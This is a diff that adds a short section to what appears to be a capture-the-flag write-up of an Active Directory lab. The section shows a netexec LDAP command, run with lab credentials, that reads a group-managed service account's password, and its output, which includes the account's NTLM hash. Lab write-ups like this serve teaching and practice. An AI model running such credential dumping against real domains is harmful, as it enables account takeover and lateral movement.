@@ -629,6 +629,18 @@ Now its domain local, and i should be able to add him to the group
 
 Now the user is part of the group!
 
+# Compromising `Pong_gMSA$`
+
+```python
+❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb -u c.roberts -p 'AssumedBreach123' -k -d ping.htb --gmsa                                      
+LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
+LDAP        dc2.pong.htb    389    DC2              [*] Getting GMSA Passwords
+LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: 989bd748ac8dd0b71ab24edccc9fc012     PrincipalsAllowedToReadPassword: gMSA Managers
+```
+
+And now i can get the NTLM of `Pong_gMSA$`
+
 
 
 
